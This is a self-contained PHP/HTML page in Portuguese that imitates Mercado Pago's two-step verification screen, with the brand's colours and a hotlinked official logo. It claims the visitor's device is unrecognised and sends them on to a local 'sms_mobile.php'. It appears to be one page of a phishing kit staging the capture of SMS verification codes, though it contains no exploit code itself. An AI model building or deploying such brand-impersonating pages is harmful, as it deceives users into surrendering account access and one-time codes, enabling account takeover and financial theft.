<?php
// Nenhuma lógica de servidor é necessária para esta tela,
// pois ela é puramente informativa antes do próximo passo.
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de duas etapas</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul: #3483fa;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
            --cor-fundo: #f5f5f5;
            --cor-card: #fff;
        }
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--cor-fundo);
            color: var(--cor-texto-primaria);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .main-header {
            background-color: var(--cor-amarela);
            padding: 12px 24px;
            flex-shrink: 0;
        }
        .main-header img {
            height: 30px;
        }
        main {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        .verification-card {
            background-color: var(--cor-card);
            border-radius: 6px;
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            padding: 48px;
            text-align: center;
            max-width: 440px;
            width: 100%;
            box-sizing: border-box;
        }
        .card-icon {
            margin-bottom: 24px;
        }
        .card-title {
            font-size: 22px;
            font-weight: 500;
            margin: 0 0 12px 0;
            color: var(--cor-texto-primaria);
        }
        .card-description {
            font-size: 16px;
            color: var(--cor-texto-secundaria);
            line-height: 1.5;
            margin: 0 auto 32px auto;
        }
        .btn {
            display: inline-block;
            padding: 14px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            border: none;
            text-decoration: none;
        }
        .btn-primary {
            background-color: var(--cor-azul);
            color: white;
            min-width: 150px;
        }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main>
        <div class="verification-card">
            <div class="card-icon">
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M32 5.33331C32 5.33331 53.3333 10.6666 53.3333 21.3333V42.6666C50.6667 48 42.6667 56 32 58.6666C21.3333 56 13.3333 48 10.6667 42.6666V21.3333C10.6667 10.6666 32 5.33331 32 5.33331Z" stroke="#FFE600" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M24 32L29.3333 37.3333L40 26.6667" stroke="#3483FA" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            <h1 class="card-title">Use um segundo método de verificação para confirmar que a conta pertence a você</h1>
            <p class="card-description">Não reconhecemos o dispositivo pelo qual você está acessando. Por segurança, vamos te pedir um segundo método de verificação.</p>
            
            <a href="sms_mobile.php" class="btn btn-primary">Continuar</a>
        </div>
    </main>

</body>
</html>